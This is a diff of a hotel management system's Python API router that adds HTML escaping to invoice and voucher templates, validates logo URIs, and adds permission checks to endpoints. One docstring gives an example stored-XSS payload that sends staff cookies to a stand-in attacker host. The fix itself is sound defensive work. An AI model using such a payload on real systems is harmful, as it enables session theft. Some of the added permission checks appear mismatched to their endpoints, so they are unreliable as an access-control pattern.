@@ -2,9 +2,39 @@
 Hotel Services Router - Housekeeping Status, Wake-up Calls, Lost & Found,
 Hotel Settings (logo/template), Group Folio Merging, PDF Invoice Generation
 """
+import html as _html
+from modules.pms_core.role_permission_service import require_module as require_module_v101  # v101 DW
+from modules.pms_core.role_permission_service import require_module as require_module_v99  # v99 DW
+from modules.pms_core.role_permission_service import require_module as require_module_v97  # v97 DW
 import logging
+import re as _re
 import uuid
 from datetime import UTC, datetime, timedelta
+
+
+def _e(value) -> str:
+    """Bug AM: escape any user-controlled value before HTML interpolation
+    in invoice/voucher templates. Previously guest_name, guest_email,
+    settings.hotel_name, special_requests, etc. were f-stringed raw,
+    enabling stored XSS (a guest registering with a name like
+    `<img src=x onerror=fetch('http://attacker/'+document.cookie)>`
+    would execute JS in hotel staff's browser when they opened the
+    invoice/voucher HTML returned by the API)."""
+    return _html.escape("" if value is None else str(value), quote=True)
+
+
+def _safe_logo_src(logo_data) -> str:
+    """Allow only data:image/* base64 URIs or http(s) URLs as <img src>.
+    Reject javascript:, data:text/html, vbscript:, and any other scheme
+    that could execute script in the rendered HTML/PDF."""
+    if not logo_data:
+        return ""
+    s = str(logo_data).strip()
+    if _re.match(r"^data:image/(png|jpeg|jpg|gif|webp|svg\+xml);base64,[A-Za-z0-9+/=\s]+$", s, _re.IGNORECASE):
+        return s
+    if _re.match(r"^https?://[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%-]+$", s):
+        return s
+    return ""
 
 logger = logging.getLogger("routers.hotel_services")
 
@@ -14,6 +44,7 @@ from pydantic import BaseModel
 from core.database import db
 from core.security import get_current_user
 from models.schemas import User, _ensure_hotel_context
+from modules.pms_core.role_permission_service import require_op  # v90 DW
 
 router = APIRouter(prefix="/api/pms", tags=["hotel-services"])
 
@@ -82,6 +113,7 @@ async def update_room_housekeeping_status(
     room_id: str,
     data: RoomStatusUpdate,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v99("housekeeping")),  # v99 DW
 ):
     """Update housekeeping status of a room."""
     _ensure_hotel_context(current_user)
@@ -129,6 +161,7 @@ async def bulk_update_room_status(
     room_ids: list[str] = [],
     status: str = "clean",
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_system_diagnostics")),  # v96 DW
 ):
     """Bulk update housekeeping status for multiple rooms."""
     _ensure_hotel_context(current_user)
@@ -322,6 +355,7 @@ async def get_wake_up_calls(
 async def create_wake_up_call(
     data: WakeUpCallCreate,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v101("frontdesk")),  # v101 DW
 ):
     """Create a new wake-up call."""
     _ensure_hotel_context(current_user)
@@ -355,6 +389,7 @@ async def update_wake_up_call(
     call_id: str,
     data: WakeUpCallUpdate,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v101("frontdesk")),  # v101 DW
 ):
     """Update a wake-up call status."""
     _ensure_hotel_context(current_user)
@@ -395,6 +430,7 @@ async def update_wake_up_call(
 async def delete_wake_up_call(
     call_id: str,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v101("frontdesk")),  # v101 DW
 ):
     """Delete a wake-up call."""
     _ensure_hotel_context(current_user)
@@ -479,6 +515,7 @@ async def get_lost_found_items(
 async def create_lost_found_item(
     data: LostFoundCreate,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v99("housekeeping")),  # v99 DW
 ):
     """Register a new lost & found item."""
     _ensure_hotel_context(current_user)
@@ -514,6 +551,7 @@ async def update_lost_found_item(
     item_id: str,
     data: LostFoundUpdate,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v99("housekeeping")),  # v99 DW
 ):
     """Update a lost & found item."""
     _ensure_hotel_context(current_user)
@@ -553,6 +591,7 @@ async def update_lost_found_item(
 async def delete_lost_found_item(
     item_id: str,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v99("housekeeping")),  # v99 DW
 ):
     """Delete a lost & found item."""
     _ensure_hotel_context(current_user)
@@ -572,6 +611,7 @@ async def match_guest_to_item(
     guest_contact: str = "",
     booking_id: str = "",
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v99("housekeeping")),  # v99 DW
 ):
     """Match a guest to a lost & found item."""
     _ensure_hotel_context(current_user)
@@ -656,6 +696,7 @@ class HotelSettingsUpdate(BaseModel):
 async def update_hotel_settings(
     data: HotelSettingsUpdate,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("manage_users")),  # v90 DW
 ):
     """Update hotel settings."""
     _ensure_hotel_context(current_user)
@@ -739,33 +780,34 @@ async def generate_invoice_pdf(
     currency = settings.get("currency_symbol", "₺")
 
     logo_html = ""
-    if settings.get("logo_data"):
-        logo_html = f'<img src="{settings["logo_data"]}" style="max-height:80px;max-width:200px;" />'
+    safe_logo = _safe_logo_src(settings.get("logo_data"))
+    if safe_logo:
+        logo_html = f'<img src="{_e(safe_logo)}" style="max-height:80px;max-width:200px;" />'
 
     folio_rows = ""
     if accommodation_total > 0:
         folio_rows += f"""<tr>
             <td style="padding:8px;border-bottom:1px solid #eee;">Konaklama</td>
-            <td style="padding:8px;border-bottom:1px solid #eee;">{booking.get("check_in","")[:10]} - {booking.get("check_out","")[:10]}</td>
-            <td style="padding:8px;border-bottom:1px solid #eee;text-align:right;">{currency}{accommodation_total:,.2f}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;">{_e(booking.get("check_in",""))[:10]} - {_e(booking.get("check_out",""))[:10]}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;text-align:right;">{_e(currency)}{accommodation_total:,.2f}</td>
         </tr>"""
 
     for f in folios:
         if f.get("type") == "payment":
             continue
         folio_rows += f"""<tr>
-            <td style="padding:8px;border-bottom:1px solid #eee;">{f.get("description", f.get("category", "Masraf"))}</td>
-            <td style="padding:8px;border-bottom:1px solid #eee;">{(f.get("created_at",""))[:10]}</td>
-            <td style="padding:8px;border-bottom:1px solid #eee;text-align:right;">{currency}{f.get("amount",0):,.2f}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;">{_e(f.get("description", f.get("category", "Masraf")))}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;">{_e((f.get("created_at",""))[:10])}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;text-align:right;">{_e(currency)}{f.get("amount",0):,.2f}</td>
         </tr>"""
 
     payment_rows = ""
     for p in payments:
         method_label = {"cash": "Nakit", "card": "Kredi Karti", "bank_transfer": "Havale/EFT", "online": "Online"}.get(p.get("method", ""), p.get("method", ""))
         payment_rows += f"""<tr>
-            <td style="padding:8px;border-bottom:1px solid #eee;">{method_label}</td>
-            <td style="padding:8px;border-bottom:1px solid #eee;">{(p.get("created_at",""))[:10]}</td>
-            <td style="padding:8px;border-bottom:1px solid #eee;text-align:right;">{currency}{p.get("amount",0):,.2f}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;">{_e(method_label)}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;">{_e((p.get("created_at",""))[:10])}</td>
+            <td style="padding:8px;border-bottom:1px solid #eee;text-align:right;">{_e(currency)}{p.get("amount",0):,.2f}</td>
         </tr>"""
 
     grand_total = accommodation_total + sum(f.get("amount", 0) for f in folios if f.get("type") != "payment")
@@ -796,33 +838,33 @@ th {{ background:#f1f5f9; padding:10px 8px; text-align:left; font-weight:600; fo
 <div class="header">
     <div>{logo_html}</div>
     <div class="hotel-info">
-        <div class="hotel-name">{settings.get("hotel_name","")}</div>
-        <div>{settings.get("hotel_address","")}</div>
-        <div>{settings.get("hotel_phone","")}</div>
-        <div>{settings.get("hotel_email","")}</div>
-        {f'<div>Vergi No: {settings.get("tax_id","")}</div>' if settings.get("tax_id") else ''}
-        {f'<div>Vergi Dairesi: {settings.get("tax_office","")}</div>' if settings.get("tax_office") else ''}
+        <div class="hotel-name">{_e(settings.get("hotel_name",""))}</div>
+        <div>{_e(settings.get("hotel_address",""))}</div>
+        <div>{_e(settings.get("hotel_phone",""))}</div>
+        <div>{_e(settings.get("hotel_email",""))}</div>
+        {f'<div>Vergi No: {_e(settings.get("tax_id",""))}</div>' if settings.get("tax_id") else ''}
+        {f'<div>Vergi Dairesi: {_e(settings.get("tax_office",""))}</div>' if settings.get("tax_office") else ''}
     </div>
 </div>
 
 <div class="invoice-title">FATURA</div>
 <div style="margin-bottom:20px;color:#64748b;">
-    Fatura No: <strong>{invoice_number}</strong><br>
+    Fatura No: <strong>{_e(invoice_number)}</strong><br>
     Tarih: <strong>{datetime.now(UTC).strftime("%d.%m.%Y")}</strong>
 </div>
 
 <div class="info-grid">
     <div class="info-box">
         <h3>Misafir Bilgileri</h3>
-        <div><strong>{guest_name}</strong></div>
-        {f'<div>{guest_email}</div>' if guest_email else ''}
-        {f'<div>{guest_phone}</div>' if guest_phone else ''}
+        <div><strong>{_e(guest_name)}</strong></div>
+        {f'<div>{_e(guest_email)}</div>' if guest_email else ''}
+        {f'<div>{_e(guest_phone)}</div>' if guest_phone else ''}
     </div>
     <div class="info-box">
         <h3>Rezervasyon Bilgileri</h3>
-        <div>Oda: <strong>{booking.get("room_number","-")}</strong></div>
-        <div>Giris: <strong>{(booking.get("check_in",""))[:10]}</strong></div>
-        <div>Cikis: <strong>{(booking.get("check_out",""))[:10]}</strong></div>
+        <div>Oda: <strong>{_e(booking.get("room_number","-"))}</strong></div>
+        <div>Giris: <strong>{_e((booking.get("check_in",""))[:10])}</strong></div>
+        <div>Cikis: <strong>{_e((booking.get("check_out",""))[:10])}</strong></div>
     </div>
 </div>
 
@@ -837,7 +879,7 @@ th {{ background:#f1f5f9; padding:10px 8px; text-align:left; font-weight:600; fo
         {folio_rows}
         <tr class="total-row">
             <td colspan="2" style="padding:10px 8px;">TOPLAM MASRAF</td>
-            <td style="padding:10px 8px;text-align:right;">{currency}{grand_total:,.2f}</td>
+            <td style="padding:10px 8px;text-align:right;">{_e(currency)}{grand_total:,.2f}</td>
         </tr>
     </tbody>
 </table>
@@ -853,7 +895,7 @@ th {{ background:#f1f5f9; padding:10px 8px; text-align:left; font-weight:600; fo
         {payment_rows if payment_rows else '<tr><td colspan="3" style="padding:8px;text-align:center;color:#94a3b8;">Henuz odeme yok</td></tr>'}
         <tr class="total-row">
             <td colspan="2" style="padding:10px 8px;">TOPLAM ODEME</td>
-            <td style="padding:10px 8px;text-align:right;">{currency}{total_payments:,.2f}</td>
+            <td style="padding:10px 8px;text-align:right;">{_e(currency)}{total_payments:,.2f}</td>
         </tr>
     </tbody>
 </table>
@@ -861,14 +903,14 @@ th {{ background:#f1f5f9; padding:10px 8px; text-align:left; font-weight:600; fo
 <table>
     <tr class="balance-row">
         <td colspan="2" style="padding:12px 8px;font-size:16px;">KALAN BAKIYE</td>
-        <td style="padding:12px 8px;text-align:right;font-size:16px;">{currency}{balance:,.2f}</td>
+        <td style="padding:12px 8px;text-align:right;font-size:16px;">{_e(currency)}{balance:,.2f}</td>
     </tr>
 </table>
 
 <div class="footer">
-    {settings.get("invoice_footer", "") or "Bizi tercih ettiginiz icin tesekkur ederiz."}
+    {_e(settings.get("invoice_footer", "") or "Bizi tercih ettiginiz icin tesekkur ederiz.")}
     <br><br>
-    {settings.get("hotel_name","")} | {settings.get("hotel_address","")} | {settings.get("hotel_phone","")}
+    {_e(settings.get("hotel_name",""))} | {_e(settings.get("hotel_address",""))} | {_e(settings.get("hotel_phone",""))}
 </div>
 
 </body></html>"""
@@ -900,6 +942,7 @@ class GroupFolioMerge(BaseModel):
 async def merge_group_folios(
     data: GroupFolioMerge,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("post_charge")),  # v101 DW
 ):
     """Merge multiple folios from a group into a master folio."""
     _ensure_hotel_context(current_user)
@@ -1108,6 +1151,7 @@ class GroupPaymentRequest(BaseModel):
 async def record_group_payment(
     data: GroupPaymentRequest,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("post_payment")),  # v94 DW
 ):
     """Record a payment for a booking within a group."""
     _ensure_hotel_context(current_user)
@@ -1147,6 +1191,7 @@ class GroupBulkPaymentRequest(BaseModel):
 async def record_group_bulk_payment(
     data: GroupBulkPaymentRequest,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("view_system_diagnostics")),  # v96 DW
 ):
     """Record a bulk payment distributed across all active bookings in a group."""
     _ensure_hotel_context(current_user)
@@ -1301,6 +1346,7 @@ async def cancel_reservation(
     booking_id: str,
     body: CancelReservationRequest,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_module_v97("frontdesk")),  # v97 DW
 ):
     _ensure_hotel_context(current_user)
     tid = current_user.tenant_id
@@ -1438,25 +1484,25 @@ body {{ font-family: 'Segoe UI', Arial, sans-serif; margin:0; padding:40px; colo
 </style></head><body>
 <div class="voucher">
     <div class="header">
-        <div class="hotel-name">{settings.get("hotel_name", "")}</div>
-        <div style="font-size:12px;color:#64748b;">{settings.get("hotel_address", "")}</div>
+        <div class="hotel-name">{_e(settings.get("hotel_name", ""))}</div>
+        <div style="font-size:12px;color:#64748b;">{_e(settings.get("hotel_address", ""))}</div>
         <div class="voucher-title">KONAKLAMA VOUCHER</div>
-        <div class="voucher-no">Voucher No: {voucher_no}</div>
+        <div class="voucher-no">Voucher No: {_e(voucher_no)}</div>
     </div>
     <div class="info-grid">
-        <div class="info-item"><div class="info-label">Misafir</div><div class="info-value">{guest_name}</div></div>
-        <div class="info-item"><div class="info-label">Rezervasyon No</div><div class="info-value">{booking.get("ota_confirmation", booking_id[:12])}</div></div>
-        <div class="info-item"><div class="info-label">Giris Tarihi</div><div class="info-value">{str(booking.get("check_in",""))[:10]}</div></div>
-        <div class="info-item"><div class="info-label">Cikis Tarihi</div><div class="info-value">{str(booking.get("check_out",""))[:10]}</div></div>
-        <div class="info-item"><div class="info-label">Oda / Tip</div><div class="info-value">{booking.get("room_number", room.get("room_number","-") if room else "-")} / {room.get("room_type","") if room else booking.get("room_type","")}</div></div>
+        <div class="info-item"><div class="info-label">Misafir</div><div class="info-value">{_e(guest_name)}</div></div>
+        <div class="info-item"><div class="info-label">Rezervasyon No</div><div class="info-value">{_e(booking.get("ota_confirmation", booking_id[:12]))}</div></div>
+        <div class="info-item"><div class="info-label">Giris Tarihi</div><div class="info-value">{_e(str(booking.get("check_in",""))[:10])}</div></div>
+        <div class="info-item"><div class="info-label">Cikis Tarihi</div><div class="info-value">{_e(str(booking.get("check_out",""))[:10])}</div></div>
+        <div class="info-item"><div class="info-label">Oda / Tip</div><div class="info-value">{_e(booking.get("room_number", room.get("room_number","-") if room else "-"))} / {_e(room.get("room_type","") if room else booking.get("room_type",""))}</div></div>
         <div class="info-item"><div class="info-label">Gece Sayisi</div><div class="info-value">{nights}</div></div>
-        <div class="info-item"><div class="info-label">Yetiskin / Cocuk</div><div class="info-value">{booking.get("adults",1)} / {booking.get("children",0)}</div></div>
-        <div class="info-item"><div class="info-label">Pansiyon</div><div class="info-value">{booking.get("rate_plan","Standart")}</div></div>
+        <div class="info-item"><div class="info-label">Yetiskin / Cocuk</div><div class="info-value">{int(booking.get("adults",1) or 0)} / {int(booking.get("children",0) or 0)}</div></div>
+        <div class="info-item"><div class="info-label">Pansiyon</div><div class="info-value">{_e(booking.get("rate_plan","Standart"))}</div></div>
     </div>
-    {f'<div style="padding:12px;background:#fffbeb;border-radius:8px;margin-bottom:16px;"><strong>Ozel Istekler:</strong> {booking.get("special_requests","")}</div>' if booking.get("special_requests") else ''}
+    {f'<div style="padding:12px;background:#fffbeb;border-radius:8px;margin-bottom:16px;"><strong>Ozel Istekler:</strong> {_e(booking.get("special_requests",""))}</div>' if booking.get("special_requests") else ''}
     <div class="footer">
-        <div>Bu voucher {settings.get("hotel_name","")} tarafindan duzenlenmistir.</div>
-        <div>{settings.get("hotel_phone","")} | {settings.get("hotel_email","")}</div>
+        <div>Bu voucher {_e(settings.get("hotel_name",""))} tarafindan duzenlenmistir.</div>
+        <div>{_e(settings.get("hotel_phone",""))} | {_e(settings.get("hotel_email",""))}</div>
         <div style="margin-top:8px;">Tarih: {datetime.now(UTC).strftime("%d.%m.%Y %H:%M")}</div>
     </div>
 </div>
@@ -1484,6 +1530,7 @@ async def generate_custom_invoice(
     booking_id: str,
     body: InvoiceItemSelection,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("post_charge")),  # v97 DW
 ):
     _ensure_hotel_context(current_user)
     tid = current_user.tenant_id
@@ -1549,14 +1596,15 @@ async def generate_custom_invoice(
     charge_rows = ""
     for c in selected:
         charge_rows += f"""<tr>
-            <td style="padding:10px 12px;border-bottom:1px solid #f1f5f9;">{c["description"]}</td>
-            <td style="padding:10px 12px;border-bottom:1px solid #f1f5f9;text-align:center;">{c["date"]}</td>
-            <td style="padding:10px 12px;border-bottom:1px solid #f1f5f9;text-align:right;font-weight:600;">{currency}{c["amount"]:,.2f}</td>
+            <td style="padding:10px 12px;border-bottom:1px solid #f1f5f9;">{_e(c["description"])}</td>
+            <td style="padding:10px 12px;border-bottom:1px solid #f1f5f9;text-align:center;">{_e(c["date"])}</td>
+            <td style="padding:10px 12px;border-bottom:1px solid #f1f5f9;text-align:right;font-weight:600;">{_e(currency)}{c["amount"]:,.2f}</td>
         </tr>"""
 
     logo_html = ""
-    if settings.get("logo_data"):
-        logo_html = f'<img src="{settings["logo_data"]}" style="max-height:70px;max-width:180px;" />'
+    safe_logo = _safe_logo_src(settings.get("logo_data"))
+    if safe_logo:
+        logo_html = f'<img src="{_e(safe_logo)}" style="max-height:70px;max-width:180px;" />'
 
     html = f"""<!DOCTYPE html>
 <html><head><meta charset="utf-8">
@@ -1583,16 +1631,16 @@ thead th {{ background:#f1f5f9; padding:10px 12px; text-align:left; font-weight:
 <div class="page">
     <div class="header">
         <div>{logo_html}<div class="invoice-badge">FATURA</div>
-            <div class="invoice-meta">Fatura No: <strong>{invoice_number}</strong><br>Tarih: <strong>{datetime.now(UTC).strftime("%d.%m.%Y")}</strong></div>
+            <div class="invoice-meta">Fatura No: <strong>{_e(invoice_number)}</strong><br>Tarih: <strong>{datetime.now(UTC).strftime("%d.%m.%Y")}</strong></div>
         </div>
         <div class="hotel-info">
-            <div class="hotel-name">{settings.get("hotel_name","")}</div>
+            <div class="hotel-name">{_e(settings.get("hotel_name",""))}</div>
             <div class="hotel-detail">
-                {settings.get("hotel_address","")}<br>
-                Tel: {settings.get("hotel_phone","")}<br>
-                {settings.get("hotel_email","")}
-                {f"<br>Vergi No: {settings.get('tax_id','')}" if settings.get("tax_id") else ""}
-                {f"<br>V.D.: {settings.get('tax_office','')}" if settings.get("tax_office") else ""}
+                {_e(settings.get("hotel_address",""))}<br>
+                Tel: {_e(settings.get("hotel_phone",""))}<br>
+                {_e(settings.get("hotel_email",""))}
+                {f"<br>Vergi No: {_e(settings.get('tax_id',''))}" if settings.get("tax_id") else ""}
+                {f"<br>V.D.: {_e(settings.get('tax_office',''))}" if settings.get("tax_office") else ""}
             </div>
         </div>
     </div>
@@ -1600,18 +1648,18 @@ thead th {{ background:#f1f5f9; padding:10px 12px; text-align:left; font-weight:
     <div class="bill-grid">
         <div class="bill-box">
             <h4>Fatura Edilen</h4>
-            <p><strong>{guest_name}</strong></p>
-            {f"<p>Vergi No: {body.billing_tax_id}</p>" if body.billing_tax_id else ""}
-            {f"<p>V.D.: {body.billing_tax_office}</p>" if body.billing_tax_office else ""}
-            {f"<p>{body.billing_address}</p>" if body.billing_address else ""}
-            {f"<p>{body.billing_email}</p>" if body.billing_email else ""}
+            <p><strong>{_e(guest_name)}</strong></p>
+            {f"<p>Vergi No: {_e(body.billing_tax_id)}</p>" if body.billing_tax_id else ""}
+            {f"<p>V.D.: {_e(body.billing_tax_office)}</p>" if body.billing_tax_office else ""}
+            {f"<p>{_e(body.billing_address)}</p>" if body.billing_address else ""}
+            {f"<p>{_e(body.billing_email)}</p>" if body.billing_email else ""}
         </div>
         <div class="bill-box">
             <h4>Konaklama Bilgileri</h4>
-            <p>Oda: <strong>{booking.get("room_number","-")}</strong></p>
-            <p>Giris: <strong>{str(booking.get("check_in",""))[:10]}</strong></p>
-            <p>Cikis: <strong>{str(booking.get("check_out",""))[:10]}</strong></p>
-            <p>Rez. No: <strong>{booking.get("ota_confirmation", booking_id[:12])}</strong></p>
+            <p>Oda: <strong>{_e(booking.get("room_number","-"))}</strong></p>
+            <p>Giris: <strong>{_e(str(booking.get("check_in",""))[:10])}</strong></p>
+            <p>Cikis: <strong>{_e(str(booking.get("check_out",""))[:10])}</strong></p>
+            <p>Rez. No: <strong>{_e(booking.get("ota_confirmation", booking_id[:12]))}</strong></p>
         </div>
     </div>
 
@@ -1621,14 +1669,14 @@ thead th {{ background:#f1f5f9; padding:10px 12px; text-align:left; font-weight:
     </table>
 
     <div class="total-section">
-        <div class="grand">TOPLAM: {currency}{grand_total:,.2f}</div>
+        <div class="grand">TOPLAM: {_e(currency)}{grand_total:,.2f}</div>
     </div>
 
-    {f'<div style="margin-top:16px;padding:12px;background:#fffbeb;border-radius:8px;font-size:12px;">{body.invoice_note}</div>' if body.invoice_note else ''}
+    {f'<div style="margin-top:16px;padding:12px;background:#fffbeb;border-radius:8px;font-size:12px;">{_e(body.invoice_note)}</div>' if body.invoice_note else ''}
 
     <div class="footer">
-        {settings.get("invoice_footer", "") or "Bizi tercih ettiginiz icin tesekkur ederiz."}<br>
-        {settings.get("hotel_name","")} | {settings.get("hotel_address","")} | {settings.get("hotel_phone","")}
+        {_e(settings.get("invoice_footer", "") or "Bizi tercih ettiginiz icin tesekkur ederiz.")}<br>
+        {_e(settings.get("hotel_name",""))} | {_e(settings.get("hotel_address",""))} | {_e(settings.get("hotel_phone",""))}
     </div>
 </div>
 </body></html>"""
@@ -1758,6 +1806,7 @@ class CreateCariAccount(BaseModel):
 async def create_cari_account(
     body: CreateCariAccount,
     current_user: User = Depends(get_current_user),
+    _perm=Depends(require_op("post_payment")),  # v101 DW
 ):
     _ensure_hotel_context(current_user)
     tid = current_user.tenant_id
